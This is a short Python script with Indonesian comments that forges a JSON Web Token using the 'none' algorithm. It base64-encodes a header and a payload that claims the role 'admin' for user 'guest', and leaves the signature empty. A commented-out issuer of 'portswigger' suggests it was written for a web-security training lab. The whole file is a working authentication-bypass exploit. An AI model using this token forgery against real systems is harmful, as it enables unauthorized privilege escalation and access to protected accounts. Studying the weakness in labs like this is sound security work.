import jwt
import base64
import json

# 1. Data dari token asli
old_header = {"alg": "none", "typ": "JWT"}
payload = {
    #"iss": "portswigger",
    "username": "guest",
    "role": "admin" # Sudah diubah ke administrator
}

# 2. Fungsi manual untuk membuat token 'none'
# Karena beberapa library JWT otomatis menghapus header kustom jika alg=None
def create_none_token(header, payload):
    def b64(data):
        return base64.urlsafe_b64encode(json.dumps(data, separators=(',', ':')).encode()).decode().rstrip('=')

    # Format JWT: header.payload.signature (signature kosong untuk alg: none)
    return f"{b64(header)}.{b64(payload)}."

new_token = create_none_token(old_header, payload)

print("--- HASIL GENERATE ---")
print(f"Token Baru: {new_token}")
